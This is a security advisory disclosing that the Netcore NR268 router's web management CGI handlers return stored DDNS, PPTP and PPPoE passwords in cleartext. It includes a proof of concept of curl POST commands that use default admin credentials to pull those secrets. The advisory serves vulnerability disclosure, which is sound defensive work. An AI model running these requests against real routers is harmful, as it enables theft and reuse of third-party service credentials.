# Netcore NR268 Cleartext Disclosure of Stored Service Secrets in Management Responses

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Cleartext Storage / Information Disclosure (CWE-312 / CWE-200)  
**Credits:** Zhou Ao, Zhang Yu, Yang Yang, Liu Xin @Nebusec

## Summary

The NR268 web management interface returns stored DDNS, PPTP, and PPPoE passwords in cleartext to any authenticated management client. Multiple CGI handlers serialize those secrets directly into HTTP responses, and the PPPoE account dump also writes a plaintext export file that can be downloaded from the management UI. Ordinary POSTs to `/router/ddns_wan_list_show.cgi`, `/router/pptpd_user_show.cgi`, and `/router/pppoe_server_account_dump.cgi` expose reusable third-party credentials instead of masked placeholders.

## Technical Details

The affected show/export handlers treat stored password fields as readable configuration instead of write-only secrets. After an authenticated POST, the JSON body includes fields such as `password1` / `password`. The frontend JavaScript then writes those values back into password form fields.

The PPPoE account dump path additionally writes the same plaintext credentials to `/tmp/pppoe_account.file`, which the management page exposes as a downloadable export.

### Affected Endpoint

- URL: `/router/ddns_wan_list_show.cgi`, `/router/pptpd_user_show.cgi`, `/router/pppoe_server_account_dump.cgi`
- Parameters: `noneed=noneed`
- Method: POST
- Authentication: HTTP Basic authentication

## Proof of Concept

```bash
curl -s -u admin:admin -X POST "http://192.168.1.1/router/ddns_wan_list_show.cgi" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "noneed=noneed"

curl -s -u admin:admin -X POST "http://192.168.1.1/router/pptpd_user_show.cgi" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "noneed=noneed"

curl -s -u admin:admin -X POST "http://192.168.1.1/router/pppoe_server_account_dump.cgi" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "noneed=noneed"
```

The PPPoE management page also exposes `./pppoe_account.file` as a plaintext export.

### Outcome

The device returns HTTP 200 JSON bodies containing stored secrets in cleartext, including fields such as `password1` and `password`, instead of a masked placeholder.

## Impact

- **Confidentiality:** High – reusable DDNS, PPTP, and PPPoE credentials are exposed.
- **Integrity:** Low
- **Availability:** Low

Anyone with a valid management session, or who reuses a captured management context, can recover third-party service credentials and reuse them outside the router.
